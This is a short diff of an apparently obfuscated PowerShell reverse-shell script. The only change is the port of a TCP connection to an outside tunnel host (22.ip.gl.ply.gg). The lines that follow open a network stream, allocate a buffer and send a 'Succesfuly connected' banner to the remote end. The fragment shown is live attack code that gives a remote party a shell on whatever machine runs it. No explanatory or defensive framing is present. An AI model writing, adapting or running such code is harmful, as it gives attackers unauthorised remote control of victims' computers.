@@ -1,4 +1,4 @@
-$KLK = New-Object System.Net.Sockets.TCPClient('22.ip.gl.ply.gg','41586');
+$KLK = New-Object System.Net.Sockets.TCPClient('22.ip.gl.ply.gg','44995');
 $PLP = $KLK.GetStream();
 [byte[]]$VVCCA = 0..((2-shl(3*5))-1)|%{0};
 $VVCCA = ([text.encoding]::UTF8).GetBytes("Succesfuly connected .`n`n")
